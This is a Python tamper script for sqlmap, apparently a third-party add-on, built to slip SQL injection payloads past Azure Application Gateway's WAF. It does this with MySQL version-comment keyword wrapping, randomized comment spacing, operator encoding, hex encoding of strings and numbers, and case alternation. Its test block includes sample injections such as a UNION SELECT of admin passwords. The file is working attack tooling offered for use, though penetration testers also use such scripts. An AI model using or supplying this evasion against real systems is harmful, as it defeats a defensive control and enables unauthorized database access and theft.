"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: azurewaf2026.py
Description: Azure Application Gateway WAF bypass with hex encoding and LIKE alternatives
Author: Regaan
Priority: HIGHEST

Azure WAF specific behaviors:
- Hates unbalanced quotes
- Sensitive to certain character sets
- Pattern matches on common comparison operators

Techniques:
1. Hex encoding for all string literals (avoids quote issues)
2. Operator encoding with LIKE BINARY alternatives where safe
3. MySQL version comments with varied versions
4. Space replacement with randomized comments
5. Numeric obfuscation (hex format)

Chain with: --tamper=azurewaf2026,cloudflare2025 for layered bypass
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    # Not running in SQLMap context
    pass

from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_keyword_wrap_rule,
    create_comment_chaos_rule,
    create_value_encode_rule,
    create_case_alternate_rule,
    create_hex_encode_rule,
    create_numeric_obfuscation_rule,
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Azure Application Gateway WAF bypass
    
    Applies transformations focused on Azure's specific patterns:
    1. Keyword wrapping (/*!50000SELECT*/)
    2. Comment chaos (varied comment styles between tokens)
    3. Operator encoding (%3D, %3E, etc.)
    4. Hex encoding for ALL strings (critical for Azure)
    5. Numeric to hex (1 -> 0x1)
    6. Case alternation (sElEcT)
    
    Azure specific:
    - Heavy use of hex encoding to avoid quote parsing issues
    - Varied comment insertion to break pattern matching
    - Encodes numbers as hex to avoid numeric literal detection
    
    Example:
        Input:  SELECT * FROM users WHERE name='admin'
        Output: Keywords wrapped, strings as 0x..., varied comments
    """
    
    if not payload:
        return payload
    
    # Create transformer
    transformer = SQLTransformer()
    
    # Add rules in correct order for Azure WAF
    
    # 1. Wrap keywords in MySQL version comments
    transformer.add_rule(create_keyword_wrap_rule())
    
    # 2. Replace spaces with varied comments (chaos mode)
    transformer.add_rule(create_comment_chaos_rule(seed="azure2026"))
    
    # 3. Encode operators
    transformer.add_rule(create_value_encode_rule())
    
    # 4. Hex encode ALL strings (critical for Azure)
    transformer.add_rule(create_hex_encode_rule())
    
    # 5. Hex encode numbers
    transformer.add_rule(create_numeric_obfuscation_rule(style="hex"))
    
    # 6. Case alternation
    transformer.add_rule(create_case_alternate_rule())
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        # If transformation fails, return original
        return payload


if __name__ == "__main__":
    # Test the tamper script
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "SELECT * FROM users WHERE name='admin'",
        "UNION SELECT password FROM admin WHERE role='superuser'",
        "SELECT * FROM users WHERE id>=5 AND active=1",
    ]
    
    print("=" * 70)
    print("Azure WAF 2026 - Context-Aware Token-Based Tamper Script")
    print("=" * 70)
    
    for query in test_queries:
        result = tamper(query)
        print(f"\nOriginal:    {query}")
        print(f"Transformed: {result}")
